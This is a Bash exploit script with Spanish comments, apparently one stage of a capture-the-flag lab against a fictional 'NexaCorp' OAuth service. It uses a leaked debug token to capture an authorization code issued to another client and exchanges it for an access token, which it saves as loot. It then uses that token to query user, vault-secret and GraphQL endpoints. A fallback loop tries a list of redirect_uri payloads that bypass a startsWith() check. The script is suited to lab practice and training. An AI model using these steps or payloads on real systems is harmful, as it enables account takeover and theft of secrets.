#!/usr/bin/env bash
# Stage 2 — robar el authorization code que va al cliente legítimo
# Pista: "Una credencial destinada a otra persona termina en tus manos"
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

CLIENT_ID="nexacorp-prod"
REDIRECT_URI="https://app.nexacorp.io/callback"

# Refrescar el recon_token (rota cada request)
echo "[*] Obteniendo recon_token fresco..."
FRESH_TOKEN=$(curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ debugInfo { recon_token } }"}' \
  | jq -r '.data.debugInfo.recon_token')
echo "    ${FRESH_TOKEN}"
echo

echo "[*] 1) GET /oauth/authorize — capturando Location header con el code"
RESP=$(curl -s -i -G "${API_URL}/oauth/authorize" \
  --data-urlencode "client_id=${CLIENT_ID}" \
  --data-urlencode "redirect_uri=${REDIRECT_URI}" \
  --data-urlencode "response_type=code" \
  --data-urlencode "recon_token=${FRESH_TOKEN}" \
  --data-urlencode "state=test$(date +%s)")
echo "${RESP}"
echo
echo "----- fin del response -----"
echo

# Extraer el code del Location header
CODE=$(echo "${RESP}" | grep -i '^Location:' | grep -oE 'code=[^&[:space:]]+' | head -1 | cut -d= -f2)
ACCESS_TOKEN=$(echo "${RESP}" | grep -i '^Location:' | grep -oE 'access_token=[^&[:space:]]+' | head -1 | cut -d= -f2)

if [[ -n "${CODE}" ]]; then
  echo "##############################################"
  echo "[+] CODE capturado: ${CODE}"
  echo "##############################################"
  echo

  echo "[*] 2) POST /oauth/token con el code"
  TOKEN_RESP=$(curl -s -X POST "${API_URL}/oauth/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code&code=${CODE}&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}")
  echo "${TOKEN_RESP}" | jq

  ACCESS_JWT=$(echo "${TOKEN_RESP}" | jq -r '.access_token // .id_token // .token // empty')
  if [[ -n "${ACCESS_JWT}" ]]; then
    echo "${ACCESS_JWT}" > "${LOOT_DIR}/stage2_access_token.jwt"
    echo
    echo "[+] Access token guardado: ${LOOT_DIR}/stage2_access_token.jwt"
    echo "[*] Decodificando payload..."
    echo "${ACCESS_JWT}" | cut -d. -f2 | base64 -d 2>/dev/null | jq

    echo
    echo "[*] 3) Probando el access_token en endpoints..."
    for ep in /api/v2/users/me /api/v2/users /api/vault/critical-secrets /api/v2/reports/generate; do
      echo "=== ${ep} ==="
      curl -s "${API_URL}${ep}" -H "Authorization: Bearer ${ACCESS_JWT}" -w '\n[%{http_code}]\n' | head -c 800
      echo
    done

    echo
    echo "[*] 4) GraphQL con el access_token de Stage 2"
    curl -s -X POST "${GQL_URL}" \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer ${ACCESS_JWT}" \
      -d '{"query":"{ me { id email role permissions } users { id email role } internalLogs vaultSecrets { id key value classification accessLevel } debugInfo { flag } }"}' | jq
  fi
elif [[ -n "${ACCESS_TOKEN}" ]]; then
  echo "[+] ACCESS_TOKEN directo (implicit flow): ${ACCESS_TOKEN}"
  echo "${ACCESS_TOKEN}" > "${LOOT_DIR}/stage2_access_token.jwt"
else
  echo "[!] No se obtuvo code/access_token. Posibles bypasses si el server validó startsWith():"
  echo
  echo "[*] Probando bypasses de redirect_uri startsWith()..."
  for bypass in \
    "${REDIRECT_URI}@nexacorp.ine.local:1337/leak" \
    "${REDIRECT_URI}.nexacorp.ine.local" \
    "${REDIRECT_URI}/../../leak" \
    "${REDIRECT_URI}#@nexacorp.ine.local" \
    "${REDIRECT_URI}?next=http://nexacorp.ine.local:1337" \
    "${REDIRECT_URI}%2e%2e%2fleak" \
    "${REDIRECT_URI}%23x" \
    "${REDIRECT_URI}/" \
    "${REDIRECT_URI}/x"; do
    echo "  redirect_uri=${bypass}"
    curl -s -i -G "${API_URL}/oauth/authorize" \
      --data-urlencode "client_id=${CLIENT_ID}" \
      --data-urlencode "redirect_uri=${bypass}" \
      --data-urlencode "response_type=code" \
      --data-urlencode "recon_token=${FRESH_TOKEN}" \
      --data-urlencode "state=test" 2>&1 | grep -iE '^HTTP|^Location:|^location:|^{'
    echo
  done
fi
